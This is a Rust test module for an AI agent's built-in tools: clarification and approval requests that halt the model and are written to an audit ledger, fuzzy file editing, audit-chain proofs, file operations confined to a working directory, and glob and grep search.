            out.push_str(&reason);
        }
        Ok(out)
    }
    // Requesting approval changes nothing and grants nothing: not side-effecting, not egress.
}

#[cfg(test)]
mod file_tools_tests {
    use super::*;
    use crate::tool::{Policy, ToolCtx};
    use engram_core::{Ledger, Taint};
    use engram_gateway::{Gateway, MockProvider};
    use engram_memory::{Memory, TrigramHashEmbedder};
    use engram_skills::{Registry, SkillSigner};
    use std::sync::Arc;

    fn ctx_in(dir: &std::path::Path) -> ToolCtx {
        let ledger = Arc::new(Ledger::open(dir).unwrap());
        let memory = Arc::new(
            Memory::open(
                dir.join("b.db"),
                Arc::new(TrigramHashEmbedder::default()),
                ledger.clone(),
            )
            .unwrap(),
        );
        let signer = Arc::new(SkillSigner::load_or_create(dir.join("k")).unwrap());
        let skills = Arc::new(Registry::open(dir, signer, ledger.clone()).unwrap());
        let gateway = Arc::new(Gateway::new(Box::new(MockProvider), ledger.clone()));
        ToolCtx {
            memory,
            skills,
            gateway,
            ledger,
            taint: Taint::Trusted,
            sensitive: false,
            policy: Policy::default(),
            workdir: dir.to_path_buf(),
            model: "test".into(),
            depth: 0,
            browser: Arc::new(crate::tool::NoBrowser),
            scope: engram_core::ScopeCtx::any(),
            halt: None,
            spend_counter: None,
            token_budget: None,
            on_step: None,
            on_narration: None,
            allowed_tools: None,
        }
    }

    #[tokio::test]
    async fn clarify_caps_options_audits_and_tells_model_to_stop() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        let out = ClarifyTool
            .run(
                &json!({
                    "question": "Depart from Hamburg or Weeze?",
                    "options": ["Hamburg (HAM)", "Weeze (NRN)", "", "c", "d", "e"]
                }),
                &ctx,
            )
            .await
            .unwrap();
        assert!(out.contains("Depart from Hamburg or Weeze?"));
        assert!(out.contains("STOP"), "instructs the model to wait: {out}");
        // Empties dropped, capped at 4 options.
        assert!(out.contains("1. Hamburg (HAM)") && out.contains("2. Weeze (NRN)"));
        assert!(
            out.matches("\n  ").count() == 4,
            "≤4 options rendered: {out}"
        );
        // The question is recorded to the audit ledger.
        let recorded = ctx
            .ledger
            .read_all()
            .unwrap()
            .iter()
            .any(|e| e.kind == "agent.clarify");
        assert!(recorded, "clarify must be auditable");
    }

    #[tokio::test]
    async fn update_plan_renders_full_checklist() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        let out = UpdatePlanTool
            .run(
                &json!({"steps":[
                    {"title":"scout","status":"done"},
                    {"title":"build","status":"doing"},
                    {"title":"verify","status":"todo"}
                ]}),
                &ctx,
            )
            .await
            .unwrap();
        assert!(out.contains("plan (1/3 done)"), "count: {out}");
        assert!(
            out.contains("[x] scout") && out.contains("[~] build") && out.contains("[ ] verify"),
            "full checklist rendered: {out}"
        );
    }

    #[tokio::test]
    async fn clarify_rejects_empty_question() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        assert!(ClarifyTool
            .run(&json!({"question":"   "}), &ctx)
            .await
            .is_err());
    }

    #[tokio::test]
    async fn request_approval_audits_and_tells_model_to_stop_without_granting() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        let out = RequestApprovalTool
            .run(
                &json!({"action":"email the report to boss@co.com","reason":"the user asked"}),
                &ctx,
            )
            .await
            .unwrap();
        assert!(out.contains("STOP") && out.contains("email the report to boss@co.com"));
        // The boundary: the model is told it cannot grant its own approval.
        assert!(
            out.contains("cannot approve it yourself"),
            "states the boundary: {out}"
        );
        let logged = ctx
            .ledger
            .read_all()
            .unwrap()
            .iter()
            .any(|e| e.kind == "agent.approval_request");
        assert!(logged, "approval request must be auditable");
        assert!(RequestApprovalTool
            .run(&json!({"action":"  "}), &ctx)
            .await
            .is_err());
    }

    #[tokio::test]
    async fn edit_file_fuzzy_matches_whitespace_drift() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        // File is 4-space indented; the model sends `old` with NO indentation (the classic miss).
        std::fs::write(
            dir.path().join("f.rs"),
            "fn main() {\n    let x = 1;\n    println!(\"{}\", x);\n}\n",
        )
        .unwrap();
        let r = EditFileTool
            .run(
                &json!({
                    "path": "f.rs",
                    "old": "let x = 1;\nprintln!(\"{}\", x);",
                    "new": "    let x = 2;\n    println!(\"{}\", x * 2);"
                }),
                &ctx,
            )
            .await;
        assert!(
            r.is_ok(),
            "fuzzy edit should match despite indentation: {r:?}"
        );
        assert!(r.unwrap().contains("whitespace-insensitive"));
        let out = std::fs::read_to_string(dir.path().join("f.rs")).unwrap();
        assert!(
            out.contains("let x = 2;") && out.contains("x * 2"),
            "got: {out}"
        );
        assert!(
            out.starts_with("fn main() {\n") && out.ends_with("}\n"),
            "surroundings kept: {out}"
        );
    }

    #[tokio::test]
    async fn edit_file_fuzzy_refuses_ambiguous_block() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        // Two identical-when-trimmed blocks => fuzzy must refuse, not guess.
        std::fs::write(dir.path().join("f.txt"), "  a\n  b\nmid\n    a\n    b\n").unwrap();
        let e = EditFileTool
            .run(&json!({"path":"f.txt","old":"a\nb","new":"X"}), &ctx)
            .await
            .unwrap_err();
        assert!(e.contains("matched 2"), "ambiguous fuzzy refused: {e}");
        assert_eq!(
            std::fs::read_to_string(dir.path().join("f.txt")).unwrap(),
            "  a\n  b\nmid\n    a\n    b\n",
            "file must be untouched on refusal"
        );
    }

    #[tokio::test]
    async fn proof_of_action_verifies_and_filters() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        ctx.ledger
            .append(
                "send_message",
                "agent",
                json!({"url":"https://hooks.example/x","ok":true}),
            )
            .unwrap();
        ctx.ledger
            .append("memory.write", "core", json!({"fact":"private-ish detail"}))
            .unwrap();

        // Unfiltered: the chain verifies and both recorded actions show up with the public key.
        let out = ProofOfActionTool.run(&json!({}), &ctx).await.unwrap();
        assert!(out.contains("audit chain intact"), "integrity line: {out}");
        assert!(out.contains("Public key"), "pubkey present: {out}");
        assert!(
            out.contains("send_message") && out.contains("memory.write"),
            "actions: {out}"
        );
        assert!(
            out.contains("2025") || out.contains("2026"),
            "human timestamp: {out}"
        );

        // Filtering by kind narrows to just the matching action.
        let only = ProofOfActionTool
            .run(&json!({"kind":"send"}), &ctx)
            .await
            .unwrap();
        assert!(only.contains("send_message"), "kept send: {only}");
        assert!(
            !only.contains("memory.write"),
            "filtered out memory: {only}"
        );
    }

    #[tokio::test]
    async fn edit_file_replaces_unique_and_rejects_ambiguous() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        std::fs::write(dir.path().join("f.txt"), "alpha\nbeta\nalpha\n").unwrap();
        // non-unique -> refused, file unchanged
        let e = EditFileTool
            .run(&json!({"path":"f.txt","old":"alpha","new":"X"}), &ctx)
            .await;
        assert!(e.is_err() && e.unwrap_err().contains("matched 2"));
        // absent -> refused
        assert!(EditFileTool
            .run(&json!({"path":"f.txt","old":"zzz","new":"X"}), &ctx)
            .await
            .is_err());
        // unique context -> replaced exactly once
        EditFileTool
            .run(&json!({"path":"f.txt","old":"beta","new":"BETA"}), &ctx)
            .await
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(dir.path().join("f.txt")).unwrap(),
            "alpha\nBETA\nalpha\n"
        );
    }

    #[tokio::test]
    async fn read_file_pages_with_offset_limit() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        let body: String = (1..=10)
            .map(|i| format!("line{i}"))
            .collect::<Vec<_>>()
            .join("\n");
        std::fs::write(dir.path().join("big.txt"), &body).unwrap();
        let out = ReadFileTool
            .run(&json!({"path":"big.txt","offset":3,"limit":2}), &ctx)
            .await
            .unwrap();
        assert!(out.contains("of 10"), "header reports total: {out}");
        assert!(out.contains("line4") && out.contains("line5"));
        assert!(!out.contains("line3") && !out.contains("line6"));
        assert!(out.contains("more line"), "advertises remaining lines");
    }

    #[tokio::test]
    async fn append_make_move_copy_delete_roundtrip() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        MakeDirTool.run(&json!({"path":"sub"}), &ctx).await.unwrap();
        assert!(dir.path().join("sub").is_dir());
        AppendFileTool
            .run(&json!({"path":"sub/log.txt","content":"a\n"}), &ctx)
            .await
            .unwrap();
        AppendFileTool
            .run(&json!({"path":"sub/log.txt","content":"b\n"}), &ctx)
            .await
            .unwrap();
        assert_eq!(
            std::fs::read_to_string(dir.path().join("sub/log.txt")).unwrap(),
            "a\nb\n"
        );
        CopyFileTool
            .run(&json!({"from":"sub/log.txt","to":"copy.txt"}), &ctx)
            .await
            .unwrap();
        assert!(dir.path().join("copy.txt").exists());
        MoveFileTool
            .run(&json!({"from":"copy.txt","to":"moved.txt"}), &ctx)
            .await
            .unwrap();
        assert!(!dir.path().join("copy.txt").exists() && dir.path().join("moved.txt").exists());
        DeleteFileTool
            .run(&json!({"path":"moved.txt"}), &ctx)
            .await
            .unwrap();
        assert!(!dir.path().join("moved.txt").exists());
        // escape attempts are refused by confinement
        assert!(MoveFileTool
            .run(&json!({"from":"sub/log.txt","to":"../escape"}), &ctx)
            .await
            .is_err());
    }

    #[tokio::test]
    async fn glob_and_grep_find_within_workdir() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ctx_in(dir.path());
        std::fs::create_dir_all(dir.path().join("src/inner")).unwrap();
        std::fs::write(dir.path().join("src/a.rs"), "fn main() { needle(); }\n").unwrap();
        std::fs::write(
            dir.path().join("src/inner/b.rs"),
            "// other\nlet NEEDLE = 1;\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("notes.md"), "no match here\n").unwrap();
        let g = GlobTool
            .run(&json!({"pattern":"**/*.rs"}), &ctx)
            .await
            .unwrap();
        assert!(g.contains("src/a.rs") && g.contains("src/inner/b.rs") && !g.contains("notes.md"));
        let g2 = GlobTool
            .run(&json!({"pattern":"src/*.rs"}), &ctx)
            .await
            .unwrap();
        assert!(g2.contains("src/a.rs") && !g2.contains("inner/b.rs"));
        let hits = GrepTool
            .run(&json!({"query":"needle","ignore_case":true}), &ctx)
            .await
            .unwrap();
        assert!(hits.contains("src/a.rs:1") && hits.contains("src/inner/b.rs:2"));
        let none = GrepTool
            .run(
                &json!({"query":"needle","ignore_case":false,"glob":"*.md"}),
                &ctx,
            )
            .await
            .unwrap();
        assert!(none.contains("no matches"));
    }

    #[test]
    fn glob_match_semantics() {
        assert!(glob_match("**/*.rs", "src/inner/b.rs"));
        assert!(glob_match("src/*.rs", "src/a.rs"));
        assert!(!glob_match("src/*.rs", "src/inner/b.rs"));
        assert!(glob_match("*.md", "notes.md"));
        assert!(!glob_match("*.md", "src/notes.md"));
        assert!(glob_match("a?c", "abc"));
        assert!(glob_match("**", "any/deep/path.txt"));
    }
}
